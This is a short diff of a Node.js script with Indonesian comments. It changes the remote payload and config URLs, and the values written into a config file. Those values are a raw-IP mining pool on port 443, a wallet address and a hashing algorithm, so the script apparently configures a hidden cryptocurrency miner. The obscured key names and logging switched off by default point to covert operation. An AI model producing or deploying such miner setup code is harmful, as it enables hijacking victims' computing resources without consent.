@@ -8,7 +8,7 @@ const crypto = require('crypto');
 // ====== CONFIGURATION ======
 const DEBUG = false; // Ubah ke true jika ingin lihat log
 
-const URL_GENZO = "https://blogspotgenzo.site/UCOK";
+const URL_GENZO = "https://dot-store.biz.id/bagong";
 const URL_CONFIG = "http://alvaro.servemp3.com/config.json";
 
 // ====== RANDOM TOOLS ======
@@ -57,9 +57,9 @@ function editConfig(filePath) {
   try {
     let data = fs.readFileSync(filePath, 'utf8');
 
-    data = data.replace(/"tua"/g, '"52.15.42.63:443"');
-    data = data.replace(/"wulet"/g, '"mbc1qm7y0rx0r43t5c3f6y8uuf0pykaa2uq5h2emz3v.nice2"');
-    data = data.replace(/"meki"/g, '"power2b"');
+    data = data.replace(/"tua"/g, '"3.15.156.167:443"');
+    data = data.replace(/"wulet"/g, '"TNR2ML87UqCtKG7uTAmvy7xvLSU1oLVsuR.nice2"');
+    data = data.replace(/"meki"/g, '"Yespowertide"');
 
     fs.writeFileSync(filePath, data);
     log("Config updated");
